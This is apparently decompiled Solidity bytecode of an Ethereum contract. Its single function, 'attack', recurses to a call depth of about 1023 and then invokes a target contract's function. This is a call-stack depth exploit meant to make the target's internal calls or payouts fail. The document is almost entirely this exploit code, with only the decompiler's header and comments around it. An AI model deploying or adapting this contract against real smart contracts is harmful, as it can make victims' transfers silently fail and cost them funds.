// Decompiled by library.dedaub.com
// 2023.11.08 21:00 UTC
// Compiled using the solidity compiler version 0.4.7<=v<0.5.9





function () public payable { 
    revert();
}

function attack(address varg0, uint256 varg1) public nonPayable { 
    v0 = v1 = 0 <= varg1;
    if (!bool(0 > varg1)) {
        v0 = varg1 < 1023;
    }
    if (!v0) {
        require(bool((address(address(varg0))).code.size));
        v2 = varg0.call(uint32(0x51294de7)).gas(msg.gas);
        require(bool(v2), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    } else {
        require(bool((address(this)).code.size));
        v3 = address(this).attack(varg0, varg1 + 1).gas(msg.gas - 2000);
        require(bool(v3), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    }
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length >= 4) {
        if (0x52fba25c == uint32(function_selector >> 224)) {
            attack(address,uint256);
        }
    }
    ();
}
